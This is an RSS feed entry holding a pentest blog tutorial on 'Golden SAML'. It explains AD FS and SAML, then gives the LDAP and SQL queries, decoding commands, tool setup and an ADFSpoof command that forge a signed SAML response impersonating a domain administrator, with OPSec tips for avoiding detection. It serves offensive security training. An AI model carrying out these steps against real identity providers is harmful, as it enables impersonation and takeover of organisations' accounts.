@@ -1,0 +1,193 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ADFS on Nodauf</title><link>https://nodauf.dev/tags/adfs/</link><description>Recent content in ADFS on Nodauf</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 01 Sep 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://nodauf.dev/tags/adfs/index.xml" rel="self" type="application/rss+xml"/><item><title>Practical guide for Golden SAML</title><link>https://nodauf.dev/p/practical-guide-for-golden-saml/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://nodauf.dev/p/practical-guide-for-golden-saml/</guid><description>&lt;img src="https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-private-key.png" alt="Featured image of post Practical guide for Golden SAML" />&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>According to Microsoft:&lt;/p>
+&lt;blockquote>
+&lt;p>Active Directory Federation Service (AD FS) enables Federated Identity and Access Management by securely sharing digital identity and entitlements rights across security and enterprise boundaries. AD FS extends the ability to use single sign-on functionality that is available within a single security or enterprise boundary to Internet-facing applications to enable customers, partners, and suppliers a streamlined user experience while accessing the web-based applications of an organization.&lt;/p>
+&lt;/blockquote>
+&lt;p>In a large network with several applications, each one of them can have an authentication process. Instead of having to authenticate on each and avoiding the risk of password reuse, the ADFS provides a &lt;strong>single sign-on&lt;/strong> solution. It is also much simpler to manage &lt;strong>one login per user&lt;/strong> than as many logins as applications per user.&lt;/p>
+&lt;p>For a concrete example, the following schema can quickly summarize the workflow of a web app using the ADFS server as an identity provider:&lt;/p>
+&lt;p>&lt;img src="https://nodauf.dev/p/practical-guide-for-golden-saml/saml-authentication-flow.jpg"
+width="700"
+height="495"
+srcset="https://nodauf.dev/p/practical-guide-for-golden-saml/saml-authentication-flow_hu71788901e9fb2d613334d5dd3ab486e8_51878_480x0_resize_q75_box.jpg 480w, https://nodauf.dev/p/practical-guide-for-golden-saml/saml-authentication-flow_hu71788901e9fb2d613334d5dd3ab486e8_51878_1024x0_resize_q75_box.jpg 1024w"
+loading="lazy"
+alt="ADFS authentication flow"
+class="gallery-image"
+data-flex-grow="141"
+data-flex-basis="339px"
+>&lt;/p>
+&lt;ol>
+&lt;li>A user wants to connect to a web application&lt;/li>
+&lt;li>The application redirects the user to the ADFS server&lt;/li>
+&lt;li>The user authenticates to the ADFS&lt;/li>
+&lt;li>Once authenticated to the ADFS, the user is redirected to the web application. Additional information is included inside the request (for example user&amp;rsquo;s groups)&lt;/li>
+&lt;li>The user is now authenticated on the application&lt;/li>
+&lt;/ol>
+&lt;h2 id="saml">SAML&lt;/h2>
+&lt;p>The previous diagram was a high abstraction of an interaction between a web application and an ADFS server.&lt;/p>
+&lt;h3 id="what-is-saml">What is SAML?&lt;/h3>
+&lt;p>Security Assertion Markup Language (SAML) is an open standard that allows identity providers (IdP) to pass authorization credentials to service providers (SP). What that jargon means is that you can use one set of credentials to log into many different websites. It’s much simpler to manage one login per user than it is to manage separate logins to email, customer relationship management (CRM) software, Active Directory, etc.&lt;/p>
+&lt;p>SAML stands for &lt;em>Security Assertion Markup Language&lt;/em>, it&amp;rsquo;s an open standard based on XML. Its primary role is to allow you to access multiple web applications using a single set of credentials. It provides &lt;strong>SSO&lt;/strong> and &lt;strong>centralization user management&lt;/strong>. The authentication information will be passed between two components: the &lt;strong>Identity Provider&lt;/strong> (ADFS) and the &lt;strong>Service Provider&lt;/strong> (web application).
+&lt;style type="text/css">.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:#444;background:#e7f2fa}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:#fff;background:#6ab0de}.notice.warning .notice-title{background:rgba(217,83,79,.9)}.notice.warning{background:#fae2e2}.notice.info .notice-title{background:#f0b37e}.notice.info{background:#fff2db}.notice.note .notice-title{background:#6ab0de}.notice.note{background:#e7f2fA}.notice.tip .notice-title{background:rgba(92,184,92,.8)}.notice.tip{background:#e6f9e6}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:0.125em;position:relative}&lt;/style>
+&lt;div>&lt;svg width="0" height="0" display="none" xmlns="http://www.w3.org/2000/svg">&lt;symbol id="tip-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet">&lt;path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"/>&lt;/symbol>&lt;symbol id="note-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet">&lt;path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/>&lt;/symbol>&lt;symbol id="warning-notice" viewBox="0 0 576 512" preserveAspectRatio="xMidYMid meet">&lt;path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/>&lt;/symbol>&lt;symbol id="info-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet">&lt;path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196 0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627 0 12 5.373 12 12v100h12c6.627 0 12 5.373 12 12v24z"/>&lt;/symbol>&lt;/svg>&lt;/div>&lt;div class="notice note" >
+&lt;p class="first notice-title">&lt;span class="icon-notice baseline">&lt;svg>&lt;use href="#note-notice">&lt;/use>&lt;/svg>&lt;/span>Note&lt;/p>&lt;p>Benefits of SSO are multiple:&lt;/p>
+&lt;ul>
+&lt;li>It avoids password reuse between application&lt;/li>
+&lt;li>The passwords are stored in only one place&lt;/li>
+&lt;li>The user&amp;rsquo;s management (for administrators and the helpdesk) is simplified&lt;/li>
+&lt;li>The password policy (length, complexity, MFA, &amp;hellip;) is centralized&lt;/li>
+&lt;/ul>&lt;/div>
+&lt;/p>
+&lt;p>Once the user is authenticated on the &lt;strong>Identity Provider&lt;/strong> (ADFS), the user is redirected to the &lt;strong>Service Provider&lt;/strong> through a &lt;strong>POST&lt;/strong> request to &lt;code>/SamlResponseServlet&lt;/code>, the XML data is base64 encoded. To prevent any modifications, the data is signed with an asymmetric encryption algorithm (like RSA).&lt;/p>
+&lt;p>Inside the XML data, the noteworthy fields are:&lt;/p>
+&lt;ul>
+&lt;li>In &lt;code>Subject&lt;/code>, the field &lt;code>NameID&lt;/code> contains the ID of the user (username or something else depending of the configuration on the SP)&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://nodauf.dev/p/practical-guide-for-golden-saml/saml-Subject-NameID.png"
+width="975"
+height="138"
+srcset="https://nodauf.dev/p/practical-guide-for-golden-saml/saml-Subject-NameID_hu869519afe9fb090485e7ae55a08433fd_37652_480x0_resize_box_3.png 480w, https://nodauf.dev/p/practical-guide-for-golden-saml/saml-Subject-NameID_hu869519afe9fb090485e7ae55a08433fd_37652_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Field NameID in SAML data "
+class="gallery-image"
+data-flex-grow="706"
+data-flex-basis="1695px"
+>&lt;/p>
+&lt;ul>
+&lt;li>In &lt;code>AttributeStatement&lt;/code> additional information can be included. For example, groups, emails,&amp;hellip;&lt;/li>
+&lt;/ul>
+&lt;p>The SP will give the proper rights according to the data sent by the SP.&lt;/p>
+&lt;div class="notice tip" >
+&lt;p class="first notice-title">&lt;span class="icon-notice baseline">&lt;svg>&lt;use href="#tip-notice">&lt;/use>&lt;/svg>&lt;/span>Tip&lt;/p>&lt;p>If you are still here, you may have understood that if an application relies on the ADFS for the authentication and the ADFS is compromised, then it is possible to craft a custom request to &lt;strong>impersonate anyone&lt;/strong> on the web applications that relies on the ADFS.&lt;/p>&lt;/div>
+&lt;h2 id="practical-guide">Practical guide&lt;/h2>
+&lt;blockquote>
+&lt;p>In this section, I assume you have a session either as an administrator or as the service account running the ADFS service.&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="necessary-information">Necessary information&lt;/h3>
+&lt;p>We need two parts:&lt;/p>
+&lt;ul>
+&lt;li>The &lt;strong>private key&lt;/strong> (PFX with the decryption password) which is only accessible with high privilege accounts.&lt;/li>
+&lt;li>Public information like the &lt;code>NameID format&lt;/code>, the &lt;code>NameID&lt;/code> to impersonate, the attributes to add in the SAML response, and the rpi identifier (matching the SP identifier - the field &lt;code>InResponseTo&lt;/code> in &lt;em>Subject → SubjectConfirmation → SubjectConfirmationData&lt;/em>)&lt;/li>
+&lt;/ul>
+&lt;p>&lt;a class="link" href="https://github.com/mandiant/ADFSDump" target="_blank" rel="noopener"
+>ADFSDump&lt;/a> is a tool written by Mandiant to retrieve the information above. The tool should be run on the ADFS. If you are lazy to compile it, you can download it &lt;a class="link" href="ADFSDump.exe" >here&lt;/a>.&lt;/p>
+&lt;ul>
+&lt;li>The private key is stored in the attribute &lt;code>thumbnailPhoto&lt;/code> of the LDAP. It is retrieved with the query &lt;code>(&amp;amp;(thumbnailphoto=*)(objectClass=contact)(!(cn=CryptoPolicy)))&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-private-key.png"
+width="1251"
+height="227"
+srcset="https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-private-key_hu99303c2bc4f5733315520032e5c8d170_7467_480x0_resize_box_3.png 480w, https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-private-key_hu99303c2bc4f5733315520032e5c8d170_7467_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="ADFSDump.exe private key"
+class="gallery-image"
+data-flex-grow="551"
+data-flex-basis="1322px"
+>&lt;/p>
+&lt;ul>
+&lt;li>For the encrypted pfx, it will connect, by default, to the WID, &lt;em>Windows Internal Database&lt;/em>, database (through the named pipes pipe &lt;code>\\.\pipe\microsoft##wid\tsql\query&lt;/code>) and retrieve the pfx with the query: &lt;code>SELECT ServiceSettingsData from {0}.IdentityServerPolicy.ServiceSettings&lt;/code> .&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-pfx.png"
+width="831"
+height="384"
+srcset="https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-pfx_hu5d6411d46fe3ad32c4249cb3a67f39f2_30152_480x0_resize_box_3.png 480w, https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-pfx_hu5d6411d46fe3ad32c4249cb3a67f39f2_30152_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="ADFSDump.exe pfx"
+class="gallery-image"
+data-flex-grow="216"
+data-flex-basis="519px"
+>&lt;/p>
+&lt;ul>
+&lt;li>The public information is also stored in the database, &lt;em>ADFSDump.exe&lt;/em> get these data with the sql query&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>SELECT SCOPES.ScopeId,SCOPES.Name,SCOPES.WSFederationPassiveEndpoint,SCOPES.Enabled,SCOPES.SignatureAlgorithm,SCOPES.EntityId,SCOPES.EncryptionCertificate,SCOPES.MustEncryptNameId, SCOPES.SamlResponseSignatureType, SCOPES.ParameterInterface, SAML.Binding, SAML.Location,POLICYTEMPLATE.name, POLICYTEMPLATE.PolicyMetadata, POLICYTEMPLATE.InterfaceVersion, SCOPEIDS.IdentityData FROM {0}.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN {0}.IdentityServerPolicy.PolicyTemplates POLICYTEMPLATE ON SCOPES.PolicyTemplateId = POLICYTEMPLATE.PolicyTemplateId LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-relying-party.png"
+width="872"
+height="485"
+srcset="https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-relying-party_hu26dad375726c063fec8f7a9e6a2dad51_15955_480x0_resize_box_3.png 480w, https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-relying-party_hu26dad375726c063fec8f7a9e6a2dad51_15955_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="ADFSDump.exe relying part"
+class="gallery-image"
+data-flex-grow="179"
+data-flex-basis="431px"
+>&lt;/p>
+&lt;p>&lt;img src="https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-access-policy.png"
+width="1308"
+height="144"
+srcset="https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-access-policy_hu2f842641f33cdb1c42c58675d341ecd2_184024_480x0_resize_box_3.png 480w, https://nodauf.dev/p/practical-guide-for-golden-saml/ADFSDump-access-policy_hu2f842641f33cdb1c42c58675d341ecd2_184024_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="ADFSDump.exe access policy"
+class="gallery-image"
+data-flex-grow="908"
+data-flex-basis="2180px"
+>&lt;/p>
+&lt;div class="notice note" >
+&lt;p class="first notice-title">&lt;span class="icon-notice baseline">&lt;svg>&lt;use href="#note-notice">&lt;/use>&lt;/svg>&lt;/span>Note&lt;/p>&lt;p>&lt;strong>ADFSDump&lt;/strong> cannot retrieve the information above if it is not a WID database.&lt;/p>&lt;/div>
+&lt;div class="notice tip" >
+&lt;p class="first notice-title">&lt;span class="icon-notice baseline">&lt;svg>&lt;use href="#tip-notice">&lt;/use>&lt;/svg>&lt;/span>Tip&lt;/p>&lt;p>&lt;strong>OPSec tips:&lt;/strong>&lt;/p>
+&lt;p>As it is stored on the LDAP, the &lt;strong>private key&lt;/strong> can be gotten from another device.&lt;/p>
+&lt;p>For the &lt;strong>public information&lt;/strong>, by default, the WID (Windows Internal Database) database is only accessible from &lt;em>localhost&lt;/em>. If an SQL Server is being used and it&amp;rsquo;s reachable from another machine, you may be able to get all the information without opening a session and executing a binary on the ADFS. You may also inspect the &lt;em>SAMLResponse&lt;/em> to retrieve this information.&lt;/p>&lt;/div>
+&lt;p>For the next step, we have to save the &lt;strong>pfx&lt;/strong> (Encrypted Signing Key) and the &lt;strong>private key&lt;/strong> in binary format.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># For the pfx&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> AAAAAQAAAAAEE&lt;span class="o">[&lt;/span>...&lt;span class="o">]&lt;/span>Qla6 &lt;span class="p">|&lt;/span> base64 -d &amp;gt; EncryptedPfx.bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># For the private key&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> f7404c7f&lt;span class="o">[&lt;/span>...&lt;span class="o">]&lt;/span>aabd8b &lt;span class="p">|&lt;/span> xxd -r -p &amp;gt; dkmKey.bin
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="crafting-the-samlresponse">Crafting the SAMLResponse&lt;/h3>
+&lt;p>&lt;a class="link" href="https://github.com/mandiant/ADFSpoof" target="_blank" rel="noopener"
+>ADFSpoof&lt;/a> is a tool written in python to generate our golden SAML from the previously collected information. Microsoft took liberties with the RFC 😒 and uses a custom &lt;em>cryptography&lt;/em> library. To have a working environment to run the tool:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">mkdir ADFSpoofTools
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> &lt;span class="nv">$_&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git clone https://github.com/dmb2168/cryptography.git
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git clone https://github.com/mandiant/ADFSpoof.git
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">virtualenv3 venvADFSSpoof
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">source&lt;/span> venvADFSSpoof/bin/activate
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip install lxml
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip install signxml
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip uninstall -y cryptography
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> cryptography
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip install -e .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> ../ADFSpoof
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip install -r requirements.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>To impersonate an administrator on the application &lt;em>&lt;a class="link" href="https://www.contoso.com" target="_blank" rel="noopener"
+>www.contoso.com&lt;/a>&lt;/em> where the ADFS is located at adfs.pentest.lab we will use the following command with the data from ADFSDump.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">python&lt;/span> &lt;span class="n">ADFSpoof&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">py&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">b&lt;/span> &lt;span class="n">EncryptedPfx&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">bin&lt;/span> &lt;span class="n">DkmKey&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">bin&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="n">adfs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pentest&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">lab&lt;/span> &lt;span class="n">saml2&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">endpoint&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">contoso&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">adfs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="n">SamlResponseServlet&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">nameidformat&lt;/span> &lt;span class="n">urn&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">oasis&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">names&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">tc&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">SAML&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mf">2.0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">nameid&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nb">format&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">transient&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">nameid&lt;/span> &lt;span class="s1">&amp;#39;PENTEST&lt;/span>&lt;span class="se">\a&lt;/span>&lt;span class="s1">dministrator&amp;#39;&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">rpidentifier&lt;/span> &lt;span class="n">Supervision&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">assertions&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;Attribute Name=&amp;#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname&amp;#34;&amp;gt;&amp;lt;AttributeValue&amp;gt;PENTEST&lt;/span>&lt;span class="se">\a&lt;/span>&lt;span class="s1">dministrator&amp;lt;/AttributeValue&amp;gt;&amp;lt;/Attribute&amp;gt;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The request 5 in the authentication flow at the beginning of the post has to be intercepted (or crafted) to paste the output generated by ADFSpoof.&lt;/p></description></item></channel></rss>
